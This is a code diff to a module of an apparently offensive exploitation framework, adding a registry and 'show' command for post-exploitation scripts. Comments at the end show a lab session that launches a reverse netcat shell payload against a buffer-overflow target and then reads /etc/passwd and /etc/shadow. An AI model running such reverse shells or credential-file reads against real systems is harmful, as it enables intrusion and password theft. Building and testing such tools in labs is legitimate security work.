@@ -31,6 +31,8 @@ class Nuurihyon(engine.Engine):
             blueprintregister.ExploitRegister(Nuurihyon.ROOTDIR + "/exploits")
         self.__payloadreg__: blueprintregister.PayloadRegister = \
             blueprintregister.PayloadRegister(Nuurihyon.ROOTDIR + "/payloads")
+        self.__scripterreg__: blueprintregister.ScripterRegister = \
+            blueprintregister.ScripterRegister(Nuurihyon.ROOTDIR + "/scripters")
 
         # Defining module's commands
         # load cmd
@@ -46,7 +48,8 @@ class Nuurihyon(engine.Engine):
         cmdshow: command.Command = command.Command(cmdname="show", nbpositionals=1,
                                                    completionlist=["commands", "name",
                                                                    "author", "options",
-                                                                   "payloads", "exploits"])
+                                                                   "payloads", "exploits",
+                                                                   "scripters"])
         showhelp: str = "Description : display option(s), command(s) and attack(s)\n" + \
                         "Usage : show {keyword} \n" + \
                         "Note :\n" + \
@@ -54,7 +57,8 @@ class Nuurihyon(engine.Engine):
                         "\tuse 'show author' to display module's author\n" + \
                         "\tuse 'show commands' to display the module's commands\n" + \
                         "\tuse 'show exploits' to display the module's exploits\n" + \
-                        "\tuse 'show payloads' to display the available payloads" + \
+                        "\tuse 'show payloads' to display the available payloads\n" + \
+                        "\tuse 'show scripters' to display the module's post-exploitation scripts\n" + \
                         "\tuse 'show options' to display valid keywords\n"
         self.addcmd(cmd=cmdshow, fct=self.show, helpstr=showhelp)
 
@@ -70,13 +74,19 @@ class Nuurihyon(engine.Engine):
             print(style.Style.info(self.name + "'s payloads"))
             for payloadref in payloadlist:
                 print(payloadref)
+        elif keyword == "SCRIPTERS":
+            scripterlist: typing.List[str] = self.__scripterreg__.list
+            print(style.Style.info(self.name + "'s post-exploitation scripts"))
+            for scripterref in scripterlist:
+                print(scripterref)
         else:
             super(Nuurihyon, self).show(keyword)
 
     def load(self, exploitref: str)->None:
         exploitref = exploitref.lower()
         exploit: exploitcore.Exploit = self.__exploitreg__[exploitref]()
-        matoi.Matoi(self.ref, self.name, exploit, self.__shellreg__, self.__payloadreg__).run()
+        matoi.Matoi(self.ref, self.name, exploit, self.__shellreg__,
+                    self.__payloadreg__, self.__scripterreg__).run()
 
     def run(self):
         try:
@@ -110,7 +120,7 @@ if __name__ == '__main__':
 
 
 # load linux_x64_ovrflwmyechosrv
-# run payload reverse/linux_netcat rhost 192.168.56.103 rport 1025 lhost 192.168.56.102 lport 4444
+# pwn payload reverse/linux_netcat rhost 192.168.56.103 rport 1025 lhost 192.168.56.102 lport 4444
 # cat /etc/passwd
 # cat /etc/shadow
 # touch /root/sploited.txt
